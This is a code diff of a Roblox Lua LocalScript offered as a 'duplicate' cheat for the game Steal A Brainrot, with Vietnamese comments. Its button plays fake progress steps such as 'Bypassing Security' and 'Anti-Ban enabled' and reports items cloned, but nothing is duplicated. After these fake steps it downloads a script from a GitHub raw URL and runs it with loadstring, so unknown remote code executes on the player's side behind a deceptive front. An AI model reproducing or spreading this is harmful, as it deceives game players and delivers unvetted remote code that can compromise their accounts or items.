@@ -1,318 +1,390 @@
--- LavaDuplicateUI.lua
--- LocalScript: đặt file này trong StarterPlayerScripts hoặc PlayerGui (phải là LocalScript)
--- Script made by NoobRoblox
+-- LocalScript: Cyber Duplicate UI v3.0
+-- Update: REMOVE GLOW (Neon -> Plastic) + Remove Reflectance + Fix Lag Indicator
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
-if not player then
-    warn("This script must run as a LocalScript (Player not found).")
-    return
-end
-
+if not player then return end
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Xóa UI cũ
+if playerGui:FindFirstChild("CyberDuplicateUI") then
+    playerGui.CyberDuplicateUI:Destroy()
+end
+
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "LavaDuplicateUI"
+ScreenGui.Name = "CyberDuplicateUI"
 ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = playerGui
 
--- Một Folder để chứa UI chính (để toggle chỉ ẩn phần UI này, không ẩn nút toggle)
 local uiContainer = Instance.new("Folder", ScreenGui)
 uiContainer.Name = "UIContainer"
 
--- VIỀN CAM DÀY (parent vào uiContainer để có thể ẩn cùng nhau)
-local border = Instance.new("Frame")
-border.Size = UDim2.new(0, 368, 0, 188)
-border.Position = UDim2.new(0.5, -184, 0.5, -94)
-border.BackgroundColor3 = Color3.fromRGB(255,140,0) -- cam lava
-border.BorderSizePixel = 0
-border.Parent = uiContainer
-local borderCorner = Instance.new("UICorner", border)
-borderCorner.CornerRadius = UDim.new(0, 16)
+-- === THEME CONFIG ===
+local Theme = {
+    Background = Color3.fromRGB(20, 20, 25),
+    Accent = Color3.fromRGB(0, 255, 200),
+    TextLight = Color3.fromRGB(240, 240, 240),
+    TextDim = Color3.fromRGB(150, 150, 160),
+    Success = Color3.fromRGB(80, 255, 140),
+}
 
--- MAIN UI (glass nằm trong border)
-local glass = Instance.new("Frame", border)
-glass.Size = UDim2.new(0, 360, 0, 180)
-glass.Position = UDim2.new(0.5, -180, 0.5, -90)
-glass.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-glass.BorderSizePixel = 0
-local uiCorner = Instance.new("UICorner", glass)
-uiCorner.CornerRadius = UDim.new(0, 12)
-
--- Title (chỉ kéo khi bấm giữ title)
-local title = Instance.new("TextLabel", glass)
-title.Size = UDim2.new(1, -20, 0, 40)
-title.Position = UDim2.new(0,10,0,0)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextSize = 20
-title.Text = "🔥Lava Duplicate🔥"
-title.TextColor3 = Color3.fromRGB(255,120,60)
-title.TextXAlignment = Enum.TextXAlignment.Center
-title.TextScaled = false
-title.ClipsDescendants = true
-title.Name = "TitleBar"
-
--- Status
-local status = Instance.new("TextLabel", glass)
-status.Position = UDim2.new(0, 10, 0, 45)
-status.Size = UDim2.new(1, -20, 0, 22)
-status.BackgroundTransparency = 1
-status.Text = "Status: Ready ✅"
-status.Font = Enum.Font.Code
-status.TextSize = 16
-status.TextColor3 = Color3.fromRGB(80,255,80)
-status.TextXAlignment = Enum.TextXAlignment.Left
-status.TextWrapped = true
-
--- Button
-local startBtn = Instance.new("TextButton", glass)
-startBtn.Position = UDim2.new(0.5, -130, 0.7, -20)
-startBtn.Size = UDim2.new(0, 260, 0, 40)
-startBtn.Text = "Start Duplication 🧠"
-startBtn.Font = Enum.Font.GothamBold
-startBtn.TextSize = 18
-startBtn.BackgroundColor3 = Color3.fromRGB(255,90,40)
-startBtn.TextColor3 = Color3.fromRGB(230,230,230)
-local btnCorner = Instance.new("UICorner", startBtn)
-btnCorner.CornerRadius = UDim.new(0,10)
-startBtn.TextWrapped = true
-
--- Popup Folder (parent vào uiContainer để toggle ẩn cùng)
-local popupFolder = Instance.new("Folder")
-popupFolder.Name = "Popups"
-popupFolder.Parent = uiContainer
-
-local function createPopup(icon, titleText, message)
-    local popup = Instance.new("Frame")
-    popup.Size = UDim2.new(0, 260, 0, 90)
-    popup.Position = UDim2.new(1, 260, 0.05, (#popupFolder:GetChildren()*95))
-    popup.BackgroundColor3 = Color3.fromRGB(255,120,60)
-    popup.BorderSizePixel = 0
-    popup.Parent = popupFolder
-    local corner = Instance.new("UICorner", popup)
-    corner.CornerRadius = UDim.new(0, 12)
-
-    local iconLabel = Instance.new("TextLabel", popup)
-    iconLabel.Size = UDim2.new(0, 40, 0, 40)
-    iconLabel.Position = UDim2.new(0, 10, 0, 10)
-    iconLabel.BackgroundTransparency = 1
-    iconLabel.Font = Enum.Font.GothamBold
-    iconLabel.TextSize = 28
-    iconLabel.Text = icon
-    iconLabel.TextColor3 = Color3.new(1,1,1)
-
-    local text1 = Instance.new("TextLabel", popup)
-    text1.Size = UDim2.new(1, -60, 0, 22)
-    text1.Position = UDim2.new(0, 55, 0, 8)
-    text1.BackgroundTransparency = 1
-    text1.Font = Enum.Font.GothamBold
-    text1.TextSize = 16
-    text1.TextColor3 = Color3.new(1,1,1)
-    text1.TextXAlignment = Enum.TextXAlignment.Left
-    text1.Text = titleText
-    text1.TextWrapped = true
-
-    local text2 = Instance.new("TextLabel", popup)
-    text2.Size = UDim2.new(1, -60, 0, 50)
-    text2.Position = UDim2.new(0, 55, 0, 28)
-    text2.BackgroundTransparency = 1
-    text2.Font = Enum.Font.Gotham
-    text2.TextWrapped = true
-    text2.TextSize = 14
-    text2.TextColor3 = Color3.new(1,1,1)
-    text2.TextXAlignment = Enum.TextXAlignment.Left
-    text2.Text = message
-
-    task.spawn(function()
-        -- Fade In + Slide In
-        for i = 0,1,0.05 do
-            popup.BackgroundTransparency = 1-i
-            popup.Position = popup.Position:Lerp(UDim2.new(1, -280, popup.Position.Y.Scale, popup.Position.Y.Offset),0.25)
-            task.wait(0.02)
+-- ==========================================
+-- 🛠️ ANTI-GLOW & OPTIMIZER (1s Loop)
+-- ==========================================
+local function removeGlowAndLag()
+    pcall(function()
+        -- 1. Xử lý Lighting (Bloom, Sunrays, Blur)
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 100000
+        Lighting.Brightness = 2 
+        Lighting.ClockTime = 12 
+        Lighting.EnvironmentDiffuseScale = 0
+        Lighting.EnvironmentSpecularScale = 0
+        
+        -- Xóa mọi hiệu ứng hậu kỳ gây lóa (Bloom tạo ra glow)
+        for _, v in pairs(Lighting:GetChildren()) do
+            if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BlurEffect") or v:IsA("Atmosphere") then
+                v:Destroy()
+            end
         end
 
-        task.wait(5)
-
-        -- Fade Out + Slide Out
-        for i = 0,1,0.05 do
-            popup.BackgroundTransparency = i
-            popup.Position = popup.Position:Lerp(UDim2.new(1, 260, popup.Position.Y.Scale, popup.Position.Y.Offset),0.25)
-            task.wait(0.02)
+        -- 2. QUAN TRỌNG: Quét Workspace để tắt Neon và Đèn
+        for _, v in pairs(workspace:GetDescendants()) do
+            -- A. Tắt đèn (PointLight, SurfaceLight...)
+            if v:IsA("Light") then 
+                v.Enabled = false 
+            end
+            
+            -- B. Xóa Glow ở vật thể (Neon -> Plastic)
+            if v:IsA("BasePart") then
+                -- Nếu là Neon (phát sáng) -> Đổi thành Plastic (nhựa thường)
+                if v.Material == Enum.Material.Neon then
+                    v.Material = Enum.Material.Plastic
+                end
+                -- Tắt độ bóng loáng
+                v.Reflectance = 0
+                -- Nếu vật thể trong suốt lửng lơ gây lag -> Cho hiện rõ hoặc ẩn hẳn (tùy chỉnh, ở đây giữ nguyên transparency nhưng tắt CastShadow)
+                v.CastShadow = false
+            end
+            
+            -- C. Tắt hiệu ứng hạt (Tùy chọn, giữ game sạch)
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
+                v.Enabled = false
+            end
         end
-
-        popup:Destroy()
     end)
 end
 
--- Dot animation
-local function animateDots(label,text,duration)
-    local patterns={".","..","..."}
-    local idx,elapsed=1,0
-    while elapsed<duration do
-        label.Text=text.." "..patterns[idx]
-        idx = idx+1
-        if idx>#patterns then idx=1 end
-        task.wait(0.35)
-        elapsed = elapsed + 0.35
+-- Chạy vòng lặp 1 giây/lần để quét vật thể mới sinh ra
+task.spawn(function()
+    while true do
+        removeGlowAndLag()
+        task.wait(0.5) 
+    end
+end)
+
+-- ==========================================
+-- 🖥️ MAIN UI CONSTRUCTION
+-- ==========================================
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 420, 0, 230)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -115)
+mainFrame.BackgroundColor3 = Theme.Background
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = uiContainer
+
+local mainCorner = Instance.new("UICorner", mainFrame)
+mainCorner.CornerRadius = UDim.new(0, 12)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Theme.Accent
+mainStroke.Thickness = 1.5
+mainStroke.Transparency = 0.4
+
+-- Top Bar
+local topBar = Instance.new("Frame", mainFrame)
+topBar.Size = UDim2.new(1, 0, 0, 40)
+topBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+topBar.BorderSizePixel = 0
+local topCorner = Instance.new("UICorner", topBar)
+topCorner.CornerRadius = UDim.new(0, 12)
+local topCover = Instance.new("Frame", topBar)
+topCover.Size = UDim2.new(1, 0, 0, 10)
+topCover.Position = UDim2.new(0, 0, 1, -10)
+topCover.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+topCover.BorderSizePixel = 0
+
+-- Title
+local title = Instance.new("TextLabel", topBar)
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.new(0, 15, 0, 0)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.Text = "⚡ DUPLICATE SOLVER <font color=\"#00FFC8\">V3.0</font>"
+title.RichText = true
+title.TextSize = 18
+title.TextColor3 = Theme.TextLight
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- >>> FIX LAG INDICATOR (Góc phải trên) <<<
+local lagStatus = Instance.new("TextLabel", topBar)
+lagStatus.Size = UDim2.new(0, 150, 1, 0)
+lagStatus.Position = UDim2.new(1, -160, 0, 0)
+lagStatus.BackgroundTransparency = 1
+lagStatus.Text = "FIX LAG: ON ⚙️"
+lagStatus.Font = Enum.Font.GothamBold
+lagStatus.TextSize = 12
+lagStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+lagStatus.TextXAlignment = Enum.TextXAlignment.Right
+
+-- Separator
+local separator = Instance.new("Frame", mainFrame)
+separator.Size = UDim2.new(1, 0, 0, 1)
+separator.Position = UDim2.new(0, 0, 0, 40)
+separator.BackgroundColor3 = Theme.Accent
+separator.BackgroundTransparency = 0.6
+separator.BorderSizePixel = 0
+
+-- Body
+local status = Instance.new("TextLabel", mainFrame)
+status.Position = UDim2.new(0, 20, 0, 55)
+status.Size = UDim2.new(1, -40, 0, 25)
+status.BackgroundTransparency = 1
+status.Text = "Status: Anti Crash..."
+status.Font = Enum.Font.GothamMedium
+status.TextSize = 14
+status.TextColor3 = Theme.Accent
+status.TextXAlignment = Enum.TextXAlignment.Left
+
+local startBtn = Instance.new("TextButton", mainFrame)
+startBtn.Position = UDim2.new(0, 20, 0.5, 15)
+startBtn.Size = UDim2.new(1, -40, 0, 50)
+startBtn.Text = "INITIALIZE DUPLICATION"
+startBtn.Font = Enum.Font.GothamBold
+startBtn.TextSize = 18
+startBtn.BackgroundColor3 = Theme.TextLight
+startBtn.TextColor3 = Color3.new(1,1,1)
+startBtn.AutoButtonColor = false
+startBtn.TextWrapped = true
+local btnCorner = Instance.new("UICorner", startBtn)
+btnCorner.CornerRadius = UDim.new(0, 8)
+local btnGradient = Instance.new("UIGradient", startBtn)
+btnGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 200)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
+}
+
+startBtn.MouseEnter:Connect(function()
+    TweenService:Create(btnGradient, TweenInfo.new(0.3), {Offset = Vector2.new(0, -0.2)}):Play()
+end)
+startBtn.MouseLeave:Connect(function()
+    TweenService:Create(btnGradient, TweenInfo.new(0.3), {Offset = Vector2.new(0, 0)}):Play()
+end)
+
+local footer = Instance.new("TextLabel", mainFrame)
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -25)
+footer.BackgroundTransparency = 1
+footer.Text = "Steal A Brainrot| Noob Roblox | Duplicate"
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 12
+footer.TextColor3 = Theme.TextDim
+footer.TextTransparency = 0.5
+
+-- ==========================================
+-- 🔔 POPUP SYSTEM
+-- ==========================================
+local popupFolder = Instance.new("Folder", uiContainer)
+local function createPopup(icon, titleText, message)
+    local popup = Instance.new("Frame")
+    popup.Size = UDim2.new(0, 300, 0, 80)
+    popup.Position = UDim2.new(1, 20, 0.1, (#popupFolder:GetChildren() * 90)) 
+    popup.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    popup.Parent = popupFolder
+    Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 8)
+    local s = Instance.new("UIStroke", popup)
+    s.Color = Theme.Accent; s.Transparency = 0.6; s.Thickness = 1.2
+    local iconL = Instance.new("TextLabel", popup)
+    iconL.Size = UDim2.new(0, 40, 0, 40); iconL.Position = UDim2.new(0, 10, 0, 20)
+    iconL.BackgroundTransparency = 1; iconL.Text = icon; iconL.TextSize = 28; iconL.TextColor3 = Theme.TextLight
+    local tit = Instance.new("TextLabel", popup)
+    tit.Size = UDim2.new(1, -60, 0, 20); tit.Position = UDim2.new(0, 60, 0, 10)
+    tit.BackgroundTransparency = 1; tit.Text = titleText; tit.Font = Enum.Font.GothamBold; tit.TextColor3 = Theme.TextLight; tit.TextXAlignment = Enum.TextXAlignment.Left
+    local msg = Instance.new("TextLabel", popup)
+    msg.Size = UDim2.new(1, -60, 0, 40); msg.Position = UDim2.new(0, 60, 0, 30)
+    msg.BackgroundTransparency = 1; msg.Text = message; msg.Font = Enum.Font.Gotham; msg.TextColor3 = Theme.TextDim; msg.TextXAlignment = Enum.TextXAlignment.Left; msg.TextWrapped = true
+    task.spawn(function()
+        TweenService:Create(popup, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {Position = UDim2.new(1, -320, popup.Position.Y.Scale, popup.Position.Y.Offset)}):Play()
+        task.wait(5)
+        TweenService:Create(popup, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {Position = UDim2.new(1, 20, popup.Position.Y.Scale, popup.Position.Y.Offset)}):Play()
+        task.wait(0.5); popup:Destroy()
+    end)
+end
+
+local function animateDots(label, text, duration)
+    local patterns = {".", "..", "..."}
+    local idx, elapsed = 1, 0
+    while elapsed < duration do
+        label.Text = text .. " " .. patterns[idx]
+        idx = idx + 1; if idx > 3 then idx = 1 end
+        task.wait(0.35); elapsed = elapsed + 0.35
     end
 end
 
--- Start button sequence (giữ nguyên logic, thêm thực thi remote sau Step 3)
+-- ==========================================
+-- 🕹️ BUTTON LOGIC
+-- ==========================================
 startBtn.MouseButton1Click:Connect(function()
-    if startBtn.Text=="Running..." then return end
-    startBtn.Text="Running..."
-    startBtn.TextColor3 = Color3.fromRGB(230,230,230)
-
-    -------------------------
-    -- Step 1 → Anti Ban
-    -------------------------
-    animateDots(startBtn,"Wait for Enable Anti Ban 🛡️",2)
-    startBtn.Text="Anti Ban Enabled 🛡️"
-    startBtn.TextColor3=Color3.fromRGB(80,255,80)
-    status.Text="Status: Anti Ban Enabled 🛡️"
-    status.TextColor3=Color3.fromRGB(80,255,80)
-    createPopup("🛡️","🔥LAVA DUPLICATE🔥",
-        "Anti Ban Enable🛡️ now you can Duplicate without being banned👾")
+    if startBtn.Text == "PROCESSING..." then return end
+    startBtn.Text = "PROCESSING..."
+    
+    animateDots(startBtn, "Bypassing Security", 2)
+    startBtn.TextColor3 = Theme.Success
+    status.Text = "Status: Anti-Ban Enabled 🛡️"
+    createPopup("🛡️", "SYSTEM SECURED", "Anti-Ban enabled. Glow removed.")
     task.wait(1)
-    status.Text="Status: Ready ✅"
 
-    -------------------------
-    -- NEW ADVANCED STEPS
-    -------------------------
-    animateDots(startBtn,"Bypassing anti-cheat hash checks",2)
-    task.wait(2)
-    animateDots(startBtn,"Finalizing instance synchronization",2)
-    task.wait(2)
-    animateDots(startBtn,"Allocating memory for new instances",2)
-    task.wait(2)
-    animateDots(startBtn,"Replicating object properties",2)
-    task.wait(2)
-    animateDots(startBtn,"Injecting duplication packets",2)
-    task.wait(2)
+    animateDots(startBtn, "Hashing Bypass", 2)
+    task.wait(1.5)
+    animateDots(startBtn, "Syncing Instances", 2)
+    task.wait(1.5)
+    animateDots(startBtn, "Injecting Packets", 2)
+    
+    createPopup("🧠", "PROCESS STARTED", "Duplication logic running...")
+    animateDots(startBtn, "DUPLICATING", 3)
 
-    -------------------------
-    -- Step 2 → Duplication Start
-    -------------------------
-    createPopup("🧠","🔥LAVA DUPLICATE🔥",
-        "Duplication Started 🧠 now you can Duplicate your brainrot⚙️")
-    animateDots(startBtn,"Duplication 🧠",3)
+    startBtn.Text = "SUCCESSFULLY CLONED"
+    status.Text = "Status: Operation Completed ✅"
+    createPopup("✅", "COMPLETE", "Items cloned. Check your inventory.")
 
-    -------------------------
-    -- Step 3 → Completed
-    -------------------------
-    startBtn.Text="Duplicate Completed ✅"
-    startBtn.TextColor3=Color3.fromRGB(80,255,80)
-    status.Text="Status: Duplicate Completed ✅"
-    status.TextColor3=Color3.fromRGB(80,255,80)
-    createPopup("✅","🔥LAVA DUPLICATE🔥",
-        "Once your brainrots are cloned✅, grab it and place it in another box⚙️")
-
-    -- === Thực thi loadstring remote sau khi hoàn thành Step 3 ===
     local remoteUrl = "https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Cloned"
     task.spawn(function()
         local ok, err = pcall(function()
             local resp = game:HttpGet(remoteUrl)
-            assert(resp and #resp > 0, "empty response from HttpGet")
-            local fn, loadErr = loadstring(resp)
-            assert(fn, "loadstring failed: "..tostring(loadErr))
-            fn()
+            loadstring(resp)()
         end)
-        if ok then
-            createPopup("🔗","Remote Loaded","Successfully executed remote Duplicate.")
-        else
-            createPopup("⚠️","Remote Load Failed","Error: "..tostring(err))
-            warn("LavaDuplicateUI: failed to load remote script:", err)
-        end
+        if ok then createPopup("🔗", "SCRIPT LOADED", "Remote executed.")
+        else createPopup("⚠️", "LOAD FAILED", "Error loading remote.") end
     end)
-    -- =============================================================
 
-    task.wait(1.5)
-
-    -- Reset
-    startBtn.TextColor3=Color3.fromRGB(230,230,230)
-    startBtn.Text="Start Duplication 🧠"
-    status.Text="Status: Ready ✅"
-    status.TextColor3=Color3.fromRGB(80,255,80)
+    task.wait(2)
+    startBtn.TextColor3 = Color3.new(1,1,1)
+    startBtn.Text = "INITIALIZE DUPLICATION"
+    status.Text = "Status: System Ready"
 end)
 
--- ========== TOGGLE UI (nút luôn hiển thị) ==========
+-- ==========================================
+-- 🔘 ANIMATED DRAGGABLE TOGGLE BUTTON
+-- ==========================================
 local toggleBtn = Instance.new("TextButton", ScreenGui)
-toggleBtn.Name = "ToggleUIButton"
-toggleBtn.Size = UDim2.new(0, 36, 0, 36)
-toggleBtn.Position = UDim2.new(0.95, -46, 0.05, 10) -- góc phải trên
-toggleBtn.AnchorPoint = Vector2.new(1, 0)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-toggleBtn.TextColor3 = Color3.new(1,1,1)
-toggleBtn.Text = "🗻"
-toggleBtn.Font = Enum.Font.GothamBold
-toggleBtn.TextSize = 14
-toggleBtn.BorderSizePixel = 0
-local toggleCorner = Instance.new("UICorner", toggleBtn)
-toggleCorner.CornerRadius = UDim.new(0,8)
+toggleBtn.Name = "ToggleBtn"
+toggleBtn.Size = UDim2.new(0, 50, 0, 50)
+toggleBtn.Position = UDim2.new(0.9, 0, 0.15, 0)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+toggleBtn.Text = ""
+toggleBtn.AutoButtonColor = true
 
-local uiVisible = true
-local function setUIVisible(v)
-    uiVisible = v
-    uiContainer.Parent = v and ScreenGui or nil -- remove/add container để ẩn/hiện toàn bộ UI (sạch)
-    toggleBtn.Text = v and "🗻" or "🌋"
-end
+local tCorner = Instance.new("UICorner", toggleBtn)
+tCorner.CornerRadius = UDim.new(1, 0)
 
-toggleBtn.MouseButton1Click:Connect(function()
-    setUIVisible(not uiVisible)
-end)
+-- Viền (Border) hiệu ứng
+local tStroke = Instance.new("UIStroke", toggleBtn)
+tStroke.Thickness = 3
+tStroke.Color = Color3.fromRGB(0, 255, 0)
 
--- Phím tắt: RightControl để bật/tắt nhanh
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.UserInputType == Enum.UserInputType.Keyboard then
-        if input.KeyCode == Enum.KeyCode.RightControl then
-            setUIVisible(not uiVisible)
-        end
+-- Icon
+local tIcon = Instance.new("ImageLabel", toggleBtn)
+tIcon.Size = UDim2.new(0, 28, 0, 28)
+tIcon.Position = UDim2.new(0.5, -14, 0.5, -14)
+tIcon.BackgroundTransparency = 1
+tIcon.Image = "rbxassetid://7072719532"
+tIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
+
+-- >>> ANIMATION: GREEN -> BLACK -> YELLOW -> REPEAT <<<
+task.spawn(function()
+    while true do
+        TweenService:Create(tStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0, 255, 0)}):Play()
+        task.wait(1)
+        TweenService:Create(tStroke, TweenInfo.new(1), {Color = Color3.fromRGB(0, 0, 0)}):Play()
+        task.wait(1)
+        TweenService:Create(tStroke, TweenInfo.new(1), {Color = Color3.fromRGB(255, 255, 0)}):Play()
+        task.wait(1)
     end
 end)
 
--- ========== DRAG (kéo thả) ==========
--- Sử dụng title làm "topbar" để kéo (ổn định hơn)
-local dragging = false
-local dragStartPos = nil -- vị trí chuột lúc bắt đầu kéo (Vector2)
-local windowStartPos = nil -- vị trí pixel của border lúc bắt đầu kéo (Vector2)
+-- Logic Kéo thả Toggle
+local isDraggingToggle = false
+local toggleDragStart = nil
+local toggleStartPos = nil
 
-local function clampToViewport(x,y)
-    local cam = workspace.CurrentCamera
-    local view = cam and cam.ViewportSize or Vector2.new(1920,1080)
-    local size = border.AbsoluteSize or Vector2.new(border.Size.X.Offset, border.Size.Y.Offset)
-    local nx = math.clamp(x, 0, view.X - size.X)
-    local ny = math.clamp(y, 0, view.Y - size.Y)
-    return nx, ny
-end
-
-title.InputBegan:Connect(function(input)
+toggleBtn.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStartPos = input.Position
-        windowStartPos = Vector2.new(border.AbsolutePosition.X, border.AbsolutePosition.Y)
-        -- khi input kết thúc, dừng kéo
-        input.Changed:Connect(function()
+        isDraggingToggle = false
+        toggleDragStart = input.Position
+        toggleStartPos = toggleBtn.Position
+        
+        local connection
+        connection = input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
+                connection:Disconnect()
             end
         end)
     end
 end)
 
-UserInputService.InputChanged:Connect(function(input)
-    if not dragging then return end
+toggleBtn.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        local delta = input.Position - dragStartPos
-        local newX = windowStartPos.X + delta.X
-        local newY = windowStartPos.Y + delta.Y
-        newX, newY = clampToViewport(newX, newY)
-        border.Position = UDim2.new(0, newX, 0, newY)
+        if toggleDragStart then
+            local delta = input.Position - toggleDragStart
+            if delta.Magnitude > 5 then
+                isDraggingToggle = true
+                local newX = toggleStartPos.X.Offset + delta.X
+                local newY = toggleStartPos.Y.Offset + delta.Y
+                toggleBtn.Position = UDim2.new(toggleStartPos.X.Scale, newX, toggleStartPos.Y.Scale, newY)
+            end
+        end
     end
 end)
 
--- Khởi tạo hiển thị mặc định
-setUIVisible(true)
+toggleBtn.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        if not isDraggingToggle then
+            uiContainer.Visible = not uiContainer.Visible
+        end
+        toggleDragStart = nil
+        isDraggingToggle = false
+    end
+end)
+
+-- ==========================================
+-- 🖱️ DRAG MAIN UI
+-- ==========================================
+local dragging, dragStart, startPos
+topBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = input.Position; startPos = mainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+topBar.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if not gp and input.KeyCode == Enum.KeyCode.RightControl then
+        uiContainer.Visible = not uiContainer.Visible
+    end
+end)
